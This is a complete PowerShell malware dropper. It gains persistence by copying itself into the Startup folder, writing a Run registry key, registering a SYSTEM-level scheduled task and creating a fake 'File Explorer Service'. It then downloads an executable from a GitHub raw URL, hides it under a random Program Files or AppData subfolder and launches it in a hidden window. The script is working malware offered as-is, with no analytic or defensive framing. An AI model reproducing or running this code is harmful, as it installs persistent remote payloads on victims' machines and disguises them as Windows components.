$FileURL       = "https://github.com/skiddyskid111/resources/raw/refs/heads/main/helper.exe"
$LaunchDelay   = 30  # Set the delay to 30 seconds
$WindowStyle   = "Hidden"

$StartupScriptPath   = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\FileExplorer.ps1"
$StartupRegPath  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$TaskName       = "FileGuardianTask"
$TaskPath       = "C:\Windows\System32\Tasks\FileGuardianTask.xml"
$ServiceName    = "FileGuardianService"

function Set-Persistence {
    try {
        if (-not (Test-Path $StartupScriptPath)) {
            Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $StartupScriptPath -Force
        }

        $command = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
        Set-ItemProperty -Path $StartupRegPath -Name "FileGuardian" -Value $command -Force

        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
        Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force

        $servicePath = "$env:SystemRoot\System32\svchost.exe"
        $serviceArgs = "-k netsvcs -p -s $ServiceName"
        $service = New-Service -Name $ServiceName -BinaryPathName "$servicePath $serviceArgs" -StartupType Automatic -Description "File Explorer Service"
        Start-Service -Name $ServiceName

        Write-Host "[+] Persistence established."
    }
    catch {
        Write-Host "[!] Failed to set persistence: $_"
    }
}

function Run-Payload {
    try {
        $possibleDirectories = @(
            "$env:ProgramFiles(x86)",
            "$env:ProgramFiles",
            "$env:APPDATA",
            "$env:LOCALAPPDATA"
        )

        $selectedDirectory = $possibleDirectories | Get-Random

        if (-not (Test-Path $selectedDirectory)) {
            throw "Selected directory does not exist: $selectedDirectory"
        }

        $subDirectories = Get-ChildItem -Path $selectedDirectory -Directory
        if ($subDirectories.Count -eq 0) {
            throw "No subdirectories found in the selected directory: $selectedDirectory"
        }

        $targetSubDirectory = $subDirectories | Get-Random
        $TargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath "katysaneur.exe"

        if (-not (Test-Path $TargetPath)) {
            Write-Host "[*] File not found downloading..."
            Invoke-WebRequest -Uri $FileURL -OutFile $TargetPath
        }

        Start-Sleep -Seconds $LaunchDelay

        Start-Process -FilePath $TargetPath -WindowStyle $WindowStyle

        Write-Host "[+] Executed: $TargetPath"
    }
    catch {
        Write-Host "[!] Failed to download or launch file: $_"
    }
}

Set-Persistence
Run-Payload
